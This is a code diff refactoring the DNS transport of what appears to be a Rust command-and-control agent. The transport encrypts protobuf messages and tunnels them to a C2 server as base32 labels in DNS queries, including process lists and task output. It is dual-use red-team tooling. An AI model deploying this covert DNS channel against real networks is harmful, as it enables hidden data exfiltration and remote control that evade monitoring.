@@ -3,7 +3,7 @@ use anyhow::{Context, Result};
 use hickory_resolver::system_conf::read_system_conf;
 use pb::c2::*;
 use pb::config::Config;
-use pb::dns::*;
+use pb::conv::*;
 use prost::Message;
 use std::sync::mpsc::{Receiver, Sender};
 use tokio::net::UdpSocket;
@@ -11,17 +11,15 @@ use tokio::net::UdpSocket;
 // Protocol limits
 const MAX_LABEL_LENGTH: usize = 63;
 const MAX_DNS_NAME_LENGTH: usize = 253;
-const CONV_ID_LENGTH: usize = 8;
 const DNS_RESPONSE_BUF_SIZE: usize = 4096;
 const DNS_QUERY_TIMEOUT_SECS: u64 = 5; // DNS query timeout in seconds
 
-// Async protocol configuration
-const SEND_WINDOW_SIZE: usize = 10; // Packets in flight
-const MAX_RETRIES_PER_CHUNK: u32 = 3; // Max retries for a chunk
+use crate::conv;
 const MAX_DATA_SIZE: usize = 50 * 1024 * 1024; // 50MB max data size
 
 /// DNS record type for queries
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[allow(clippy::upper_case_acronyms)]
 pub enum DnsRecordType {
     TXT,  // Text records (default, base32 encoded)
     A,    // IPv4 address records (binary data)
@@ -30,6 +28,7 @@ pub enum DnsRecordType {
 
 /// DNS transport using stateless packet protocol with protobuf
 #[derive(Debug, Clone)]
+#[allow(clippy::upper_case_acronyms)]
 pub struct DNS {
     base_domain: String,
     dns_server: String,
@@ -55,35 +54,6 @@ impl DNS {
         pb::xchacha::decode_with_chacha::<Req, Resp>(data)
     }
 
-    /// Generate unique conversation ID
-    fn generate_conv_id() -> String {
-        use rand::Rng;
-        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
-        let mut rng = rand::thread_rng();
-        (0..CONV_ID_LENGTH)
-            .map(|_| {
-                let idx = rng.gen_range(0..CHARSET.len());
-                CHARSET[idx] as char
-            })
-            .collect()
-    }
-
-    /// Calculate CRC32 checksum
-    fn calculate_crc32(data: &[u8]) -> u32 {
-        let mut crc = 0xffffffffu32;
-        for &byte in data {
-            crc ^= byte as u32;
-            for _ in 0..8 {
-                if crc & 1 != 0 {
-                    crc = (crc >> 1) ^ 0xedb88320;
-                } else {
-                    crc >>= 1;
-                }
-            }
-        }
-        !crc
-    }
-
     /// Calculate maximum data size that will fit in DNS query
     fn calculate_max_chunk_size(&self, total_chunks: u32) -> usize {
         // DNS limit: total_length <= 253
@@ -104,13 +74,12 @@ impl DNS {
         let max_protobuf_length = (max_encoded_length * 5) / 8;
 
         // Calculate protobuf overhead with worst-case varint sizes
-        let sample_packet = DnsPacket {
+        let sample_packet = ConvPacket {
             r#type: PacketType::Data as i32,
             sequence: total_chunks,
-            conversation_id: "a".repeat(CONV_ID_LENGTH),
+            conversation_id: "a".repeat(conv::CONV_ID_LENGTH),
             data: vec![],
             crc32: 0xFFFFFFFF,
-            window_size: SEND_WINDOW_SIZE as u32,
             acks: vec![],
             nacks: vec![],
         };
@@ -130,7 +99,7 @@ impl DNS {
     /// Build DNS query subdomain from packet
     /// Format: <base32_encoded_packet>.<base_domain>
     /// Base32 data is split into 63-char labels, total length <= 253 chars
-    fn build_subdomain(&self, packet: &DnsPacket) -> Result<String> {
+    fn build_subdomain(&self, packet: &ConvPacket) -> Result<String> {
         // Serialize packet to protobuf
         let mut buf = Vec::new();
         packet.encode(&mut buf)?;
@@ -140,7 +109,7 @@ impl DNS {
 
         // Calculate total length
         let base_domain_len = self.base_domain.len();
-        let num_labels = (encoded.len() + MAX_LABEL_LENGTH - 1) / MAX_LABEL_LENGTH;
+        let num_labels = encoded.len().div_ceil(MAX_LABEL_LENGTH);
         let total_len = encoded.len() + num_labels + base_domain_len; // +num_labels for dots between labels, +1 for dot before base_domain
 
         if total_len > MAX_DNS_NAME_LENGTH {
@@ -174,9 +143,9 @@ impl DNS {
     }
 
     /// Send packet and get response
-    async fn send_packet(&self, packet: DnsPacket) -> Result<Vec<u8>> {
+    async fn send_packet(&self, packet: ConvPacket) -> Result<Vec<u8>> {
         let subdomain = self.build_subdomain(&packet).map_err(|e| {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::error!(
                 "DNS: Failed to build subdomain for packet type={}, seq={}: {}",
                 packet.r#type,
@@ -191,7 +160,7 @@ impl DNS {
         self.try_dns_query(&self.dns_server, &query, txid)
             .await
             .map_err(|e| {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!(
                     "DNS: Query failed for packet type={}, seq={}, conv_id={}: {}",
                     packet.r#type,
@@ -416,7 +385,7 @@ impl DNS {
             for (min_chunks, max_chunks) in varint_ranges.iter() {
                 // Calculate overhead assuming worst case (max sequence in this range)
                 let chunk_size = self.calculate_max_chunk_size(*max_chunks);
-                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);
+                let total_chunks = request_data.len().div_ceil(chunk_size).max(1);
 
                 // Check if the calculated total_chunks falls within this range
                 if total_chunks >= *min_chunks as usize && total_chunks <= *max_chunks as usize {
@@ -429,14 +398,14 @@ impl DNS {
             // Fallback for very large data
             result.unwrap_or_else(|| {
                 let chunk_size = self.calculate_max_chunk_size(2097151);
-                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);
+                let total_chunks = request_data.len().div_ceil(chunk_size).max(1);
                 (chunk_size, total_chunks)
             })
         };
 
-        let data_crc = Self::calculate_crc32(request_data);
+        let data_crc = conv::calculate_crc32(request_data);
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: Request size={} bytes, chunks={}, chunk_size={} bytes, crc32={:#x}",
             request_data.len(),
@@ -466,19 +435,18 @@ impl DNS {
         let mut init_payload_bytes = Vec::new();
         init_payload.encode(&mut init_payload_bytes)?;
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: INIT packet - conv_id={}, method={}, total_chunks={}, file_size={}, data_crc32={:#x}",
             conv_id, method_code, total_chunks, data_size, data_crc
         );
 
-        let init_packet = DnsPacket {
+        let init_packet = ConvPacket {
             r#type: PacketType::Init as i32,
             sequence: 0,
             conversation_id: conv_id.to_string(),
             data: init_payload_bytes,
             crc32: 0,
-            window_size: SEND_WINDOW_SIZE as u32,
             acks: vec![],
             nacks: vec![],
         };
@@ -502,7 +470,7 @@ impl DNS {
         let mut acks = Vec::new();
         let mut nacks = Vec::new();
 
-        if let Ok(status_packet) = DnsPacket::decode(response_data) {
+        if let Ok(status_packet) = ConvPacket::decode(response_data) {
             if status_packet.r#type == PacketType::Status as i32 {
                 // Process ACKs - collect acknowledged sequences
                 for ack_range in &status_packet.acks {
@@ -519,7 +487,7 @@ impl DNS {
                 }
             }
         } else {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::debug!(
                 "DNS: Unknown response format ({} bytes), retrying chunk",
                 response_data.len()
@@ -555,17 +523,16 @@ impl DNS {
 
             let chunk = chunks[seq - 1].clone();
             let conv_id_clone = conv_id.to_string();
-            let mut transport_clone = self.clone();
+            let transport_clone = self.clone();
 
             // Spawn concurrent task for this packet
             let task = tokio::spawn(async move {
-                let data_packet = DnsPacket {
+                let data_packet = ConvPacket {
                     r#type: PacketType::Data as i32,
                     sequence: seq_u32,
                     conversation_id: conv_id_clone,
                     data: chunk.clone(),
-                    crc32: Self::calculate_crc32(&chunk),
-                    window_size: SEND_WINDOW_SIZE as u32,
+                    crc32: conv::calculate_crc32(&chunk),
                     acks: vec![],
                     nacks: vec![],
                 };
@@ -576,8 +543,8 @@ impl DNS {
 
             send_tasks.push(task);
 
-            // Limit concurrent tasks to SEND_WINDOW_SIZE
-            if send_tasks.len() >= SEND_WINDOW_SIZE {
+            // Limit concurrent tasks to conv::SEND_WINDOW_SIZE
+            if send_tasks.len() >= conv::SEND_WINDOW_SIZE {
                 if let Some(task) = send_tasks.first_mut() {
                     if let Ok(task_result) = task.await {
                         self.handle_chunk_task_result(
@@ -624,7 +591,7 @@ impl DNS {
             }
             (seq_num, Err(e)) => {
                 let err_msg = e.to_string();
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("Failed to send chunk {}: {}", seq_num, err_msg);
 
                 // If packet is too long, this is a fatal error
@@ -654,7 +621,7 @@ impl DNS {
     ) -> Result<()> {
         use std::collections::HashMap;
 
-        let mut retry_counts: HashMap<u32, u32> = HashMap::new();
+        let mut retry_counts: HashMap<u32, usize> = HashMap::new();
 
         while !nack_set.is_empty() {
             let nacks_to_retry: Vec<u32> = nack_set.drain().collect();
@@ -662,7 +629,7 @@ impl DNS {
             for nack_seq in nacks_to_retry {
                 // Check retry limit
                 let retries = retry_counts.entry(nack_seq).or_insert(0);
-                if *retries >= MAX_RETRIES_PER_CHUNK {
+                if *retries >= conv::MAX_RETRIES_PER_CHUNK {
                     return Err(anyhow::anyhow!(
                         "Max retries exceeded for chunk {}",
                         nack_seq
@@ -670,12 +637,12 @@ impl DNS {
                 }
                 *retries += 1;
 
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::debug!(
                     "DNS: Retrying chunk {} (attempt {}/{}) for conv_id={}",
                     nack_seq,
                     *retries,
-                    MAX_RETRIES_PER_CHUNK,
+                    conv::MAX_RETRIES_PER_CHUNK,
                     conv_id
                 );
 
@@ -685,13 +652,12 @@ impl DNS {
                 }
 
                 if let Some(chunk) = chunks.get((nack_seq - 1) as usize) {
-                    let retransmit_packet = DnsPacket {
+                    let retransmit_packet = ConvPacket {
                         r#type: PacketType::Data as i32,
                         sequence: nack_seq,
                         conversation_id: conv_id.to_string(),
                         data: chunk.clone(),
-                        crc32: Self::calculate_crc32(chunk),
-                        window_size: SEND_WINDOW_SIZE as u32,
+                        crc32: conv::calculate_crc32(chunk),
                         acks: vec![],
                         nacks: vec![],
                     };
@@ -718,7 +684,7 @@ impl DNS {
                             }
                         }
                         Err(e) => {
-                            #[cfg(debug_assertions)]
+                            #[cfg(feature = "print_debug")]
                             log::debug!(
                                 "DNS: Retry failed for chunk {} in conv_id={}: {}",
                                 nack_seq,
@@ -738,16 +704,15 @@ impl DNS {
 
     /// Send COMPLETE packet to server to confirm successful receipt and cleanup conversation
     async fn send_complete_packet(&mut self, conv_id: &str) -> Result<()> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!("DNS: Sending COMPLETE packet for conv_id={}", conv_id);
 
-        let complete_packet = DnsPacket {
+        let complete_packet = ConvPacket {
             r#type: PacketType::Complete as i32,
             sequence: 0,
             conversation_id: conv_id.to_string(),
             data: vec![],
             crc32: 0,
-            window_size: 0,
             acks: vec![],
             nacks: vec![],
         };
@@ -761,19 +726,18 @@ impl DNS {
 
     /// Fetch response from server, handling potentially chunked responses
     async fn fetch_response(&mut self, conv_id: &str, total_chunks: usize) -> Result<Vec<u8>> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: All {} chunks acknowledged, sending FETCH",
             total_chunks
         );
 
-        let fetch_packet = DnsPacket {
+        let fetch_packet = ConvPacket {
             r#type: PacketType::Fetch as i32,
             sequence: (total_chunks + 1) as u32,
             conversation_id: conv_id.to_string(),
             data: vec![],
             crc32: 0,
-            window_size: 0,
             acks: vec![],
             nacks: vec![],
         };
@@ -785,7 +749,7 @@ impl DNS {
             )
         })?;
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: FETCH response received ({} bytes)",
             end_response.len()
@@ -822,7 +786,7 @@ impl DNS {
         let expected_crc = metadata.data_crc32;
         let mut full_response = Vec::new();
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: Fetching chunked response - {} chunks, expected_crc={:#x}, conv_id={}",
             total_chunks,
@@ -837,13 +801,12 @@ impl DNS {
             let mut fetch_payload_bytes = Vec::new();
             fetch_payload.encode(&mut fetch_payload_bytes)?;
 
-            let fetch_packet = DnsPacket {
+            let fetch_packet = ConvPacket {
                 r#type: PacketType::Fetch as i32,
                 sequence: (base_sequence as u32 + 2 + chunk_idx as u32),
                 conversation_id: conv_id.to_string(),
                 data: fetch_payload_bytes,
                 crc32: 0,
-                window_size: 0,
                 acks: vec![],
                 nacks: vec![],
             };
@@ -857,7 +820,7 @@ impl DNS {
             full_response.extend_from_slice(&chunk_data);
         }
 
-        let actual_crc = Self::calculate_crc32(&full_response);
+        let actual_crc = conv::calculate_crc32(&full_response);
         if actual_crc != expected_crc {
             return Err(anyhow::anyhow!(
                 "Response CRC mismatch for conv_id={}: expected {:#x}, got {:#x}",
@@ -886,7 +849,7 @@ impl DNS {
             })?;
 
         // Generate conversation ID
-        let conv_id = Self::generate_conv_id();
+        let conv_id = conv::generate_conv_id();
 
         // Send INIT packet
         self.send_init_packet(
@@ -951,7 +914,12 @@ impl DNS {
     }
 }
 
+#[async_trait::async_trait]
 impl Transport for DNS {
+    fn clone_box(&self) -> Box<dyn Transport + Send + Sync> {
+        Box::new(self.clone())
+    }
+
     fn init() -> Self {
         DNS {
             base_domain: String::new(),
@@ -1018,7 +986,7 @@ impl Transport for DNS {
             record_type,
         };
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::info!(
             "DNS transport initialized - server={}, domain={}, record_type={:?}",
             dns_server,
@@ -1143,21 +1111,11 @@ impl Transport for DNS {
         self.dns_exchange(request, "/c2.C2/ReportProcessList").await
     }
 
-    async fn report_task_output(
+    async fn report_output(
         &mut self,
-        request: ReportTaskOutputRequest,
-    ) -> Result<ReportTaskOutputResponse> {
-        self.dns_exchange(request, "/c2.C2/ReportTaskOutput").await
-    }
-
-    async fn reverse_shell(
-        &mut self,
-        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "reverse_shell not supported over DNS transport"
-        ))
+        request: ReportOutputRequest,
+    ) -> Result<ReportOutputResponse> {
+        self.dns_exchange(request, "/c2.C2/ReportOutput").await
     }
 
     fn get_type(&mut self) -> pb::c2::transport::Type {
@@ -1182,6 +1140,17 @@ impl Transport for DNS {
         "dns"
     }
 
+    async fn forward_raw(
+        &mut self,
+        _path: String,
+        _rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        _tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> anyhow::Result<()> {
+        Err(anyhow::anyhow!(
+            "DNS transport does not support raw forwarding"
+        ))
+    }
+
     fn list_available(&self) -> Vec<String> {
         vec!["dns".to_string()]
     }
@@ -1191,7 +1160,7 @@ impl Transport for DNS {
 mod tests {
     use super::*;
     use crate::TransportType;
-    use pb::dns::PacketType;
+    use pb::conv::PacketType;
 
     // ============================================================
     // CRC32 Tests
@@ -1200,14 +1169,14 @@ mod tests {
     #[test]
     fn test_crc32_basic() {
         let data = b"test data for CRC validation";
-        let crc = DNS::calculate_crc32(data);
+        let crc = conv::calculate_crc32(data);
 
         // Verify same data produces same CRC
-        let crc2 = DNS::calculate_crc32(data);
+        let crc2 = conv::calculate_crc32(data);
         assert_eq!(crc, crc2);
 
         // Verify different data produces different CRC
-        let crc3 = DNS::calculate_crc32(b"test datA for CRC validation");
+        let crc3 = conv::calculate_crc32(b"test datA for CRC validation");
         assert_ne!(crc, crc3);
     }
 
@@ -1215,19 +1184,19 @@ mod tests {
     fn test_crc32_known_value() {
         // CRC32 IEEE of "123456789" is 0xCBF43926
         let data = b"123456789";
-        let crc = DNS::calculate_crc32(data);
+        let crc = conv::calculate_crc32(data);
         assert_eq!(crc, 0xCBF43926);
     }
 
     #[test]
     fn test_generate_conv_id_length() {
-        let conv_id = DNS::generate_conv_id();
-        assert_eq!(conv_id.len(), CONV_ID_LENGTH);
+        let conv_id = conv::generate_conv_id();
+        assert_eq!(conv_id.len(), conv::CONV_ID_LENGTH);
     }
 
     #[test]
     fn test_generate_conv_id_charset() {
-        let conv_id = DNS::generate_conv_id();
+        let conv_id = conv::generate_conv_id();
         for c in conv_id.chars() {
             assert!(c.is_ascii_lowercase() || c.is_ascii_digit());
         }
@@ -1235,8 +1204,8 @@ mod tests {
 
     #[test]
     fn test_generate_conv_id_uniqueness() {
-        let id1 = DNS::generate_conv_id();
-        let id2 = DNS::generate_conv_id();
+        let id1 = conv::generate_conv_id();
+        let id2 = conv::generate_conv_id();
         // Statistically, two random 8-char IDs should not be equal
         assert_ne!(id1, id2);
     }
@@ -1280,6 +1249,7 @@ mod tests {
                         interval: 5,
                         r#type: TransportType::TransportDns as i32,
                         extra: extra.to_string(),
+                        jitter: 0.0,
                     }],
                     active_index: 0,
                 }),
@@ -1349,13 +1319,12 @@ mod tests {
             record_type: DnsRecordType::TXT,
         };
 
-        let packet = DnsPacket {
+        let packet = ConvPacket {
             r#type: PacketType::Init as i32,
             sequence: 0,
             conversation_id: "test1234".to_string(),
             data: vec![0x01, 0x02],
             crc32: 0,
-            window_size: SEND_WINDOW_SIZE as u32,
             acks: vec![],
             nacks: vec![],
         };
@@ -1387,13 +1356,12 @@ mod tests {
         };
 
         // Create a packet with enough data to require label splitting
-        let packet = DnsPacket {
+        let packet = ConvPacket {
             r#type: PacketType::Data as i32,
             sequence: 1,
             conversation_id: "test1234".to_string(),
             data: vec![0xAA; 50], // 50 bytes of data
-            crc32: DNS::calculate_crc32(&vec![0xAA; 50]),
-            window_size: 10,
+            crc32: conv::calculate_crc32(&[0xAA; 50]),
             acks: vec![],
             nacks: vec![],
         };
@@ -1518,7 +1486,7 @@ mod tests {
         assert!(chunk_size > 0);
         assert_eq!(total_chunks, 1); // Even empty data needs 1 chunk
                                      // CRC is deterministic - just verify it's calculated
-        assert_eq!(crc, DNS::calculate_crc32(&[]));
+        assert_eq!(crc, conv::calculate_crc32(&[]));
     }
 
     #[test]
@@ -1534,7 +1502,7 @@ mod tests {
 
         assert!(chunk_size > 0);
         assert!(total_chunks >= 1);
-        assert_eq!(crc, DNS::calculate_crc32(&data));
+        assert_eq!(crc, conv::calculate_crc32(&data));
     }
 
     #[test]
@@ -1646,13 +1614,12 @@ mod tests {
     #[test]
     fn test_process_chunk_response_valid_status() {
         // Create a valid STATUS packet with ACKs
-        let status_packet = DnsPacket {
+        let status_packet = ConvPacket {
             r#type: PacketType::Status as i32,
             sequence: 0,
             conversation_id: "test".to_string(),
             data: vec![],
             crc32: 0,
-            window_size: 10,
             acks: vec![AckRange {
                 start_seq: 1,
                 end_seq: 3,
